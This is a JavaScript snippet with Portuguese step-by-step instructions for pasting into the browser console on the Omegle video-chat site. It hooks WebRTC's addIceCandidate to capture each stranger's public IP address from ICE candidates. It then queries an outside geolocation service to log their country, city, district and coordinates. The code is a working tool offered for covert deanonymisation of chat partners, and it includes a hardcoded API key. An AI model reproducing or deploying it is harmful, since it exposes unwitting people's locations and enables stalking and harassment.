
//                                   ***PASSO A PASSO***

//1) Primeiramente é necessário criar uma conta no site:  https://app.ipgeolocation.io/
//2) Após isso deve copiar a chave e colar dentro das aspas da linha ___
//3) Feito isso abra o Omeagle e na página principal clique com o botão direito e vá em Inspecionar
//4) Depois abra a aba Console e cole o código abaixo com a chave obtida no site em seu respectivo lugar 
//5) Pressione o Enter e mantenha com o Console aberto enquanto comunica com o desconhecido
//6) A cada desconhecido atualizará automaticamente a localização dele a menos que esta pessoa esteja usando uma VPN

//-------------------------------------------------------------------------------------------------------------------




//                              ***Código para copiar e colar no console***




let apiKey = "e215140a298e459fb05aee723222e875";

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    console.log(iceCandidate.candidate);
    const ip = fields[4];
    if (fields[7] === "srflx") {
      getLocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

let getLocation = async (ip) => {
  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
          ---------------------
          País: ${json.country_name}
          Estado: ${json.state_prov}
          Cidade: ${json.city}
          Distrito ou Bairro: ${json.district}
          Latitude / Longitude: (${json.latitude}, ${json.longitude})
          ---------------------
          `;
      console.log(output);
    })
  );
};